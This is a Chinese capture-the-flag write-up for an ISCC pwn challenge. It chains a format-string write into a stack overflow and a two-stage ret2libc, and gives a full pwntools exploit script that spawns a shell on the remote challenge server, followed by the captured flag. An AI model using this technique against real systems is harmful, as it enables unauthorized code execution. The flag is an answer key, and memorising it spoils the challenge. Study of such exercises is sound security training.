# ISCC PWN 第3题 Writeup

## 题目信息

- 题目描述：`Ready to begin the game? A simple conversation can change everything.`
- 远程：`39.96.193.120:10000`
- flag：`ISCC{1d4a862b-ffc5-4d64-8a70-162ba30d7c86}`

## 基础信息

本地附件：

```bash
file attachment-9.orig
checksec --file=attachment-9.orig
```

结果：

```text
ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE
```

程序会先输出两行提示，然后读入一段内容并直接 `printf(buf)`。如果全局变量 `target_val` 等于 `5`，就进入 `vuln`。

本地关键符号：

```text
target_val = 0x804c030
vuln       = 0x8049227
main       = 0x8049270
```

## 漏洞分析

### 1. 格式串绕过进入 vuln

`main` 中存在：

```c
read(0, buf, 0x20);
printf(buf);
if (target_val == 5) vuln();
```

用 `%p` 测试可知，用户输入位于 `printf` 第 4 个参数：

```text
AAAA.0xffbbe330.0x20.0x8049292.0x41414141...
```

所以可以把 `target_val` 地址放在输入开头，然后用 `%4$n` 写入当前输出长度。

payload：

```python
p32(0x804c030) + b"A%4$n\n"
```

解释：

- 开头 4 字节地址会被 `printf` 当普通字符输出；
- 再输出一个 `A`；
- 当前输出长度为 `5`；
- `%4$n` 将 `5` 写入第 4 个参数指向的位置，即 `target_val`。

于是 `target_val == 5`，成功进入 `vuln`。

### 2. vuln 栈溢出

本地 `vuln`：

```asm
lea eax, [ebp-0x90]
read(0, eax, 0x100)
```

保存返回地址距离缓冲区偏移：

```text
offset = 0x94
```

本地可用 `ret2dlresolve` 成功 getshell，但远程没有输出。继续对远程泄露后发现远程二进制和附件不完全一致。

## 远程差异

远程二进制是 CET/PLT 布局版本，函数地址有偏移，并且 `vuln` 的 `read` 长度变为 `0xac`。

远程关键地址：

```text
target_val  = 0x804c030
vuln        = 0x804929b
write@plt   = 0x80490f0
write@got   = 0x804c01c
offset      = 0x94
read length = 0xac
```

这也是本地 `ret2dlresolve` 直接打远程失败的主要原因：本地 `write@plt=0x8049080`，但远程实际可用的是 `.plt.sec` 中的 `write@plt=0x80490f0`，PLT 布局不同。

## 利用思路

采用稳定两阶段 ret2libc：

1. 用格式串写 `target_val=5`，进入 `vuln`；
2. 第一次栈溢出：`write(1, write@got, 4); ret=vuln`，泄露 `write` 的 libc 地址，并回到 `vuln`；
3. 根据 libc 偏移计算 `system` 和 `/bin/sh`；
4. 第二次栈溢出：`system('/bin/sh')`；
5. 执行 `cat flag`。

远程 libc 匹配：`libc6-i386_2.31-0ubuntu9.17_amd64`

使用偏移：

```text
write   = 0xf0830
system  = 0x41360
/bin/sh = 0x18c363
```

## Exploit

核心代码：

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "i386"
context.log_level = args.LOG or "info"

HOST = args.HOST or "39.96.193.120"
PORT = int(args.PORT or 10000)

TARGET_VAL = 0x804c030
VULN      = 0x804929b
WRITE_PLT = 0x80490f0
WRITE_GOT = 0x804c01c
OFFSET    = 0x94
READ_LEN  = 0xac

WRITE_OFF  = 0x0f0830
SYSTEM_OFF = 0x041360
BINSH_OFF  = 0x18c363

FMT_GATE = p32(TARGET_VAL) + b"A%4" + bytes([0x24]) + b"n\n"


def open_io(retries=8):
    last = None
    for _ in range(retries):
        try:
            io = remote(HOST, PORT, timeout=6)
            io.recvuntil(b"Hope you have a good time here.\n", timeout=6)
            return io
        except Exception as e:
            last = e
            try:
                io.close()
            except Exception:
                pass
            sleep(0.5)
    raise last


def enter_vuln(io):
    io.send(FMT_GATE)
    io.recvuntil(b"Input:\n", timeout=4)


def exploit(cmd=None):
    io = open_io()

    enter_vuln(io)
    leak_payload = flat(
        {OFFSET: [WRITE_PLT, VULN, 1, WRITE_GOT, 4]},
        length=READ_LEN,
        filler=b"A",
    )
    io.send(leak_payload)
    write_addr = u32(io.recvn(4, timeout=4))
    io.recvuntil(b"Input:\n", timeout=4)

    libc_base = write_addr - WRITE_OFF
    system_addr = libc_base + SYSTEM_OFF
    binsh_addr = libc_base + BINSH_OFF
    log.info("write=%#x libc_base=%#x system=%#x /bin/sh=%#x", write_addr, libc_base, system_addr, binsh_addr)

    shell_payload = flat(
        {OFFSET: [system_addr, 0xdeadbeef, binsh_addr]},
        length=READ_LEN,
        filler=b"B",
    )
    io.send(shell_payload)

    if cmd is None:
        io.interactive()
        return b""
    sleep(0.2)
    io.sendline(cmd.encode())
    return io.recvall(timeout=5)


if __name__ == "__main__":
    command = args.CMD or "cat flag 2>/dev/null; cat /flag 2>/dev/null; exit"
    out = exploit(command)
    if out:
        print(out.decode(errors="replace"))
```

## 远程复现

命令：

```bash
cd tasks/iscc-pwn2
./exp_remote.py CMD="cat flag 2>/dev/null; cat /flag 2>/dev/null; exit"
```

输出：

```text
[x] Opening connection to 39.96.193.120 on port 10000
[+] Opening connection to 39.96.193.120 on port 10000: Done
[*] write=0xf7e77830 libc_base=0xf7d87000 system=0xf7dc8360 /bin/sh=0xf7f13363
ISCC{1d4a862b-ffc5-4d64-8a70-162ba30d7c86}
```

# 